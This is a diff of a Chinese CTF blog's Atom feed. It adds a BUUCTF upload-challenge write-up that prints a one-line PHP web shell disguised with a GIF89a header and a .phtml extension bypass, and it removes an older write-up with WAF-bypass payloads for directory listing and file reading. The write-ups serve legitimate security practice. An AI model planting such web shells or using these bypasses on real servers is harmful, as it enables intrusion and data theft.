@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-07-08T08:25:25.035Z</updated>
+  <updated>2020-07-09T03:01:33.737Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019-upload</title>
+    <link href="http://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/"/>
+    <id>http://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/</id>
+    <published>2020-07-09T02:45:33.000Z</published>
+    <updated>2020-07-09T03:01:33.737Z</updated>
+    
+    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/1.png" alt="1"></p><p>上传界面</p><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/2.png" alt="2"></p><p>过滤了<code>&lt;?</code>那就尝试不带<code>&lt;?</code>的，前几天遇到过</p><script language="php">eval($_POST[a]);</script><p><img src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/3.png" alt="3"></p><p>还要满足图片，</p><pre><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;</code></pre><p>PHP后缀的话可以用PHP3、PHP4、phtml绕过，这里只能用phtml</p><p>上传文件都在upload目录下，蚁剑连接，在根目录下得到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>ZJCTF-NiZhuanSiWei</title>
@@ -433,29 +456,6 @@
     <updated>2020-05-30T03:37:31.942Z</updated>
     
     <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/1.png" alt="1"></p><p>并没有发现什么有用的信息，查看源代码发现</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/2.png" alt="2"></p><p>当我们传入一个cat参数，就把这个参数的值打印出来，当传入cat=dog时我们发现返回的值是一串类似flag的字符串</p><p>那么我们尝试?cat=dog 得到flag</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/3.png" alt="3"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
-    
-      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>roarctf2019-easy Calc</title>
-    <link href="http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/"/>
-    <id>http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/</id>
-    <published>2020-05-29T04:57:33.000Z</published>
-    <updated>2020-05-29T06:48:21.286Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="https://i.loli.net/2020/05/29/aKvcues4E6b5A2X.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p><img src="https://i.loli.net/2020/05/29/Dk9zKLiOSrx4gTG.jpg" alt="QQ截图20200529130218.jpg"></p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="https://i.loli.net/2020/05/29/UlnXEjeLzJVf2Ax.jpg" alt="QQ截图20200529130500.jpg"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p><img src="https://i.loli.net/2020/05/29/xJOg6MXqyvweoSi.png" alt="1.png"></p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="https://i.loli.net/2020/05/29/9LybDktjNHe6gJw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/05/29/xahgr3f9dWCqG4Z.png" alt="3.png"></p>]]></content>
     
     <summary type="html">
     
